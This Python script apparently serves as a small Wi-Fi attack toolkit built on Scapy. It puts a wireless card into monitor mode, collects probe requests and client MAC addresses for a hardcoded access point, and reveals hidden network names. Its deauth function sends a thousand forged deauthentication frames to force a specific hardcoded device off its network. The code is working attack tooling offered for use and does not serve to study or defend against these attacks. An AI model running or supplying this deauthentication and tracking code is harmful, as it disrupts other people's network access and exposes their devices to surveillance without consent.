import sys
import os
from scapy.all import *

interface= "wlx00c0ca84aba2"
ap_mac = "94:53:30:ed:7f:0a"
device_mac = "60:be:b5:f0:23:b1"
macAddresses = []
probeReqs = []
hidden_aps = []
aps = []

def sniff_probe_requests(pkt):
	

	if pkt.haslayer(Dot11ProbeReq):
		netName = pkt.getlayer(Dot11ProbeReq).info
		if netName not in probeReqs:
			probeReqs.append(netName)
			print "[+] Detected new probe request: " + netName

def sniff_all_mac_addresses(pkt):
	

	if pkt.haslayer(Dot11):
		layer = pkt.getlayer(Dot11)
		
		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
			macAddresses.append(layer.addr2)
			print "[+] Detected new mac address: " + layer.addr2

def find_hidden_ap(pkt):
	

	if pkt.haslayer(Dot11ProbeResp):
		addr2 = pkt.getlayer(Dot11).addr2
		if (addr2 in hidden_aps) and (addr2 not in aps):
			name = pkt.getlayer(Dot11ProbeResp).info
			print '[+]' + name + ' ' + addr2
			aps.append(addr2)
	if pkt.haslayer(Dot11Beacon):
		if pkt.getlayer(Dot11).info == '':
			addr2 = pkt.getlayer(Dot11).addr2
			if addr2 not in hidden_aps:
				hidden_aps.append(addr2)

def get_probe_requests():
    print "getting probe requests.."
    sniff(iface=interface, prn=sniff_probe_requests)


def get_all_mac_addresses():
	print "getting all mac addresses on network.."
	sniff(iface=interface, prn=sniff_all_mac_addresses)

def deauth_device():
	print "deauthing.."
	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
	sendp(pkt, iface=interface, count=1000, inter=1)


def find_all_hidden_aps():
	print "finding hidden ap's.."
	sniff(iface=interface, prn=find_hidden_ap)


def setup_nic():
	os.system('sudo ifconfig ' + interface + ' down')
	os.system('sudo iwconfig ' + interface + ' mode monitor')
	os.system('sudo ifconfig ' + interface + ' up')

def main():
	if sys.argv[1] == '-d':
		deauth_device()
	elif sys.argv[1] == '-g':
		get_all_mac_addresses()
	elif sys.argv[1] == '-p':
		get_probe_requests()
	elif sys.argv[1] == '-s':
		setup_nic()
	elif sys.argv[1] == '-h':
		find_all_hidden_aps()

if __name__ == "__main__":
    main()